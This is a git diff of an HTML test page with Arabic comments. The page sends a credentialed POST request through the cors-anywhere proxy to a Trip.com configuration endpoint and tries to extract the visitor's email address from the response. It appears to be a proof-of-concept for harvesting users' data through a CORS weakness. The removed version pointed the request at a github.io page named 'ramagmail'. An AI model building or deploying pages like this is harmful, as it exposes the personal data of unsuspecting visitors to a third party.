@@ -1,23 +1,41 @@
 <!DOCTYPE html>
 <html>
 <body>
-<h1>CORS Test - مع Proxy</h1>
+<h1>CORS Test - Trip.com API</h1>
 <pre id="result"></pre>
 <script>
-// ===== استخدم Proxy وسيط (Cors-Anywhere) =====
+// ===== استخدام Proxy وسيط =====
 const PROXY_URL = "https://cors-anywhere.herokuapp.com/";
-const TARGET_URL = "https://www.trip.com/restapi/soa2/24884/json/getConfiguration?url=https://omar.trip.com";
+const TARGET_URL = "https://www.trip.com/restapi/soa2/24884/json/getConfiguration?x-traceID=";
 
-// ===== البيانات للـ Proxy (text/plain) =====
-const bodyData = "data=&version=11&serverName=https://anonymous56430.github.io/ramagmail/&guid=";
+// ===== البيانات المطابقة للطلب الأصلي =====
+const tripData = {
+  head: {
+    locale: "ar-XX",
+    currency: "USD",
+    vID: "1783978788105.8e68P1hvGdSY"
+  },
+  platform: "Online",
+  componentType: "online-app-download-universal",
+  version: "6.0.5",
+  pageId: "10320668150",
+  aid: 0,
+  sid: 0,
+  customId: "adBanner",
+  customParam: {}
+};
 
 // ===== إرسال الطلب عبر Proxy =====
+// ملاحظة: الـ Cookie ستُرسل تلقائياً من المتصفح إذا كانت موجودة
 fetch(PROXY_URL + TARGET_URL, {
   method: "POST",
   headers: {
-    "Content-Type": "text/plain"
+    "Content-Type": "application/json",
+    "Host": "www.trip.com"
+    // لا نضيف Cookie يدوياً، المتصفح سيرسلها تلقائياً
   },
-  body: bodyData
+  credentials: 'include',  // هذا يخبر المتصفح بإرسال الـ Cookies
+  body: JSON.stringify(tripData)
 })
 .then(r => {
   if (!r.ok) {
@@ -26,16 +44,30 @@ fetch(PROXY_URL + TARGET_URL, {
   return r.text();
 })
 .then(responseText => {
-  document.getElementById("result").textContent = "Status: 200\n\n" + responseText;
+  // عرض الرد كامل
+  document.getElementById("result").textContent = "✅ Status: 200 OK\n\n" + responseText;
   
+  // محاولة استخراج الإيميل
   try {
     const jsonResponse = JSON.parse(responseText);
-    console.log("✅ الرد JSON صالح:", jsonResponse);
+    console.log("📦 الرد الكامل:", jsonResponse);
+    
+    // استخراج الإيميل
     if (jsonResponse.email) {
       console.log("📧 الإيميل موجود:", jsonResponse.email);
+      document.getElementById("result").textContent += "\n\n📧 الإيميل: " + jsonResponse.email;
+    } else {
+      console.log("⚠️ الإيميل غير موجود في الرد");
     }
+    
+    // استخراج معلومات إضافية
+    if (jsonResponse.ResponseStatus) {
+      console.log("📊 الحالة:", jsonResponse.ResponseStatus.Ack);
+    }
+    
   } catch(e) {
     console.log("⚠️ الرد ليس JSON صالح");
+    console.log("الرد النصي:", responseText);
   }
 })
 .catch(e => {
